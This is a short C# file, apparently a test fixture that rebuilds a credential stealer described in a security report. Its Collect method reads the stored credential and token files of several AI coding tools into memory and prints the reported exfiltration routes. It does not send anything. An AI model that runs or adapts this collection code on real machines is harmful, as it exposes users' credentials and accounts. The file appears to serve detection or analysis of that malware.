using System;
using System.IO;
using System.Net.Http;
using System.Collections.Generic;

class Collector {
    // The paths and transport phases are reconstructed from the report.
    public static void Collect(string root, HttpClient receiver, Uri server) {
        string[] paths = {
            ".claude\\credentials.json",
            ".codex\\auth.json",
            "gemini-cli-workspace-token.json",
            ".claude.json",
            ".codex\\config.toml",
            ".codeium\\config.json",
            "Cursor - Insiders\\User\\globalStorage\\state.vscdb"
        };
        var records = new Dictionary<string, byte[]>();
        foreach (var path in paths) {
            var full = Path.Combine(root, path);
            if (File.Exists(full)) records[path] = File.ReadAllBytes(full);
        }
        receiver.DefaultRequestHeaders.Add("x-gate-token", "fixture");
        // Route references test the reported protocol identity; this fixture
        // does not assert the original encryption or handshake implementation.
        var routes = new [] { "/v2/handshake", "/v2/chunk", "/v2/complete" };
        foreach (var route in routes) Console.WriteLine(new Uri(server, route));
    }
}
